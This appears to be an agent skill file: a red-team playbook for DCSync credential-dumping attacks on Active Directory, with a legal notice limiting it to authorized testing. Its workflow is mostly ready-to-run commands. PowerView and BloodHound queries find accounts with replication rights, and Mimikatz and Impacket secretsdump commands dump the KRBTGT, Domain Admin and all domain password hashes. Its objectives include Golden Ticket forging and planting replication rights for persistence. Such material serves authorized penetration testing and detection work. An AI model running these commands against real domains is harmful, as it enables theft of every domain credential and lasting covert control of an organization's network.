---
name: conducting-domain-persistence-with-dcsync
description: Perform DCSync attacks by abusing MS-DRSR replication rights (DS-Replication-Get-Changes/-All) to impersonate a Domain Controller and extract KRBTGT, Domain Admin, and service account hashes for Golden Ticket forging, typically with Mimikatz. Use in authorized engagements after finding principals with replication rights, to establish long-term domain persistence, or to validate detections for replication abuse.
when-to-use: Perform DCSync attacks by abusing MS-DRSR replication rights (DS-Replication-Get-Changes/-All) to impersonate a Domain Controller and extract KRBTGT, Domain Admin, and service account hashes for Golde
domain: cybersecurity
subdomain: red-teaming
tags:
- red-team
- active-directory
- dcsync
- persistence
- credential-dumping
- golden-ticket
- mimikatz
version: '1.0'
author: mahipal
license: Apache-2.0
d3fend_techniques:
- Application Protocol Command Analysis
- Network Isolation
- Network Traffic Analysis
- Client-server Payload Profiling
- Platform Monitoring
nist_csf:
- ID.RA-01
- GV.OV-02
- DE.AE-07
mitre_attack:
- T1003.006
- T1207
- T1098
---
# Conducting Domain Persistence with DCSync


> **Legal Notice:** This skill is for authorized security testing and educational purposes only. Unauthorized use against systems you do not own or have written permission to test is illegal and may violate computer fraud laws.

## Overview

DCSync is an attack technique that abuses the Microsoft Directory Replication Service Remote Protocol (MS-DRSR) to impersonate a Domain Controller and request password data from the target DC. The attack was introduced by Benjamin Delpy (Mimikatz author) and Vincent Le Toux, leveraging the DS-Replication-Get-Changes and DS-Replication-Get-Changes-All extended rights. Any principal (user or computer) with these rights can replicate password hashes for any account in the domain, including the KRBTGT account. With the KRBTGT hash, attackers can forge Golden Tickets for indefinite domain persistence. DCSync is categorized as MITRE ATT&CK T1003.006 and is a critical post-exploitation technique used by APT groups including APT28 (Fancy Bear), APT29 (Cozy Bear), and FIN6.


## When to Use

- When conducting security assessments that involve conducting domain persistence with dcsync
- When following incident response procedures for related security events
- When performing scheduled security testing or auditing activities
- When validating security controls through hands-on testing

## Prerequisites

- Familiarity with red teaming concepts and tools
- Access to a test or lab environment for safe execution
- Python 3.8+ with required dependencies installed
- Appropriate authorization for any testing activities

## Objectives

- Identify accounts with DCSync (replication) rights in Active Directory
- Perform DCSync using Mimikatz or Impacket's secretsdump.py
- Extract the KRBTGT account hash for Golden Ticket creation
- Dump all domain user password hashes for credential analysis
- Forge Golden Tickets for persistent domain access
- Grant DCSync rights to a controlled account for alternative persistence
- Document the attack chain and persistence mechanisms

## MITRE ATT&CK Mapping

- **T1003.006** - OS Credential Dumping: DCSync
- **T1558.001** - Steal or Forge Kerberos Tickets: Golden Ticket
- **T1222.001** - File and Directory Permissions Modification: Windows
- **T1098** - Account Manipulation
- **T1078.002** - Valid Accounts: Domain Accounts

## Workflow

### Phase 1: Identify Accounts with DCSync Rights
1. Enumerate principals with replication rights:
   ```powershell
   # Using PowerView
   Get-DomainObjectAcl -SearchBase "DC=domain,DC=local" -ResolveGUIDs |
     Where-Object { ($_.ObjectAceType -match 'Replicating') -and
                    ($_.ActiveDirectoryRights -match 'ExtendedRight') } |
     Select-Object SecurityIdentifier, ObjectAceType

   # Using BloodHound Cypher query
   MATCH (u)-[:DCSync|GetChanges|GetChangesAll*1..]->(d:Domain)
   RETURN u.name, d.name
   ```
2. Using Impacket's FindDelegation or custom LDAP query:
   ```bash
   # Check with Impacket
   findDelegation.py domain.local/user:'Password123' -dc-ip 10.10.10.1
   ```
3. Default accounts with DCSync rights:
   - Domain Admins
   - Enterprise Admins
   - Domain Controllers group
   - SYSTEM on Domain Controllers

### Phase 2: DCSync Credential Extraction
1. Using Mimikatz (Windows):
   ```powershell
   # Dump specific account (KRBTGT for Golden Ticket)
   mimikatz.exe "lsadump::dcsync /domain:domain.local /user:krbtgt"

   # Dump Domain Admin
   mimikatz.exe "lsadump::dcsync /domain:domain.local /user:administrator"

   # Dump all domain accounts
   mimikatz.exe "lsadump::dcsync /domain:domain.local /all /csv"
   ```
2. Using Impacket secretsdump.py (Linux):
   ```bash
   # Dump all credentials
   secretsdump.py domain.local/admin:'Password123'@10.10.10.1

   # Dump specific user
   secretsdump.py -just-dc-user krbtgt domain.local/admin:'Password123'@10.10.10.1

   # Dump only NTLM hashes (no Kerberos keys)
   secretsdump.py -just-dc-ntlm domain.local/admin:'Password123'@10.10.10.1

   # Using Kerberos authentication
   export KRB5CCNAME=admin.ccache
   secretsdump.py -k -no-pass domain.local/admin@DC01.domain.local
   ```

> 📎 详细内容（完整示例 / 参考 / 数据表）已拆分至同目录 `reference.md`，按需用 Read 读取对应小节。
